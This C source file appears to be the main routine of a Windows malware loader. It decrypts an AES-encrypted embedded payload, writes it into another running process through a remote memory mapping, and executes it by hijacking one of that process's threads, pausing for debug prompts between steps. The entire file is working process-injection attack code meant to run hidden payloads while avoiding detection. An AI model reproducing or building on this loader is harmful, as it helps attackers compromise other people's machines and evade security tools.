#include "../include/crypto.h"
#include "../include/mapping.h"
#include "../include/injection.h"

int main() {
    DWORD size = NULL;
    DWORD procid = 6760; //MUST BE EDITED
    DWORD remotethreadid = 0;
    PBYTE pPayload = (PBYTE)HeapAlloc(GetProcessHeap(), 0, (SIZE_T)size);
    PVOID remotePTR = NULL;
    

    printf("=== DEBUG START ===\n");
    printf("Press ENTER to start AES Decryption...");
    getchar();

    printf("\n[*] Decrypting AES CipherText...\n");
    if (!(AesBCryptDecrypt(AesCipherText, sizeof(AesCipherText), AesKey, AesIv, &pPayload, &size))) {
        printf("[!] AES Decryption Failed!\n");
        printf("Press ENTER to exit...");
        getchar();
        return -1;
    }
    printf("[+] AES Decryption Successful! Decrypted Payload Size: %d bytes\n", size);
    DWORD payloadsize = size;

    printf("\nPress ENTER to proceed to CreateRemoteMapping...");
    getchar();

    if (!(CreateRemoteMapping(procid, pPayload, payloadsize, &remotePTR))) {
        printf("[!] CreateRemoteMapping Failed!\n");
        printf("Press ENTER to exit...");
        getchar();
        return -1;
    }
    printf("[+] CreateRemoteMapping Successful! Remote Pointer: 0x%p\n", remotePTR);

    printf("\nPress ENTER to proceed to HijackRemoteThread...");
    getchar();

    if (!(HijackRemoteThread(procid, remotePTR, &remotethreadid))) {
        printf("[!] HijackRemoteThread Failed!\n");
        printf("Press ENTER to exit...");
        getchar();
        return -1;
    }
    printf("[+] HijackRemoteThread Successful! Hijacked Thread ID: %d\n", remotethreadid);

    printf("\n=== DEBUG END ===\n");
    printf("Process completed successfully. Press ENTER to exit...");
    getchar();

    return 0;
}
